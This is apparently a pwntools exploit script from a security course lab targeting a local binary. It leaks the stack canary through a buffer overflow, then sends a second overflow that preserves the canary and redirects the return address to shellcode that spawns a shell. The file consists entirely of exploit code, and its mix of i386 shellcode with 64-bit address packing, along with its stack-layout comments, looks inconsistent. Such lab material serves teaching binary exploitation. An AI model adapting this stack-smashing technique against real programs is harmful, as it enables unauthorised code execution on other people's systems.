from pwn import *

context.log_level = 'debug'
context.terminal = ["tmux", "split-window", "-h"]

env = {
            "SHELLCODE": b"\x90" * 0x1000 + asm(shellcraft.i386.linux.sh())
            }
# p = gdb.debug(["./target"], env=env)
p = process(["/home/lab06/tut06-2-leak-canary/target"], env=env)

# payload (fake stack frame to be injected)
#  0xffffce1c [  name  ] AAAAAAAA
#  0xffffce00 [  memo  ] AAAAAAAA
#  0xffffce10 [  memo  ] AAAAAAAA
#  0xffffce14 [  memo  ] AAAAAAAA
#  0xffffce18 [  memo  ] AAAAAAAA
# [] AAAAAAAA
# [] AAAAAAAA
# [] AAAAAAAA
# [] AAAAAAAA
# [] AAAAAAAA
#  0xffffce20 [  canary  ] leaked
# []
# ret addr
    
# AAAAAAAAAAAA * 4 -> leading to canary 
    
addr_shellcode = 0x000000000040127b

payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' # 48 bytes
p.sendline(payload)

p.recvuntil(payload)
canary = p.recv(8)
canary = u64(b'\x00' + canary[1:])

# payload2 = cyclic(8) * 5
payload2 = cyclic(8) * 5
payload2 += p64(canary)
payload2 += cyclic(8)
payload2 += p64(addr_shellcode)

print(len(payload2))

p.sendline(payload2)
p.interactive()

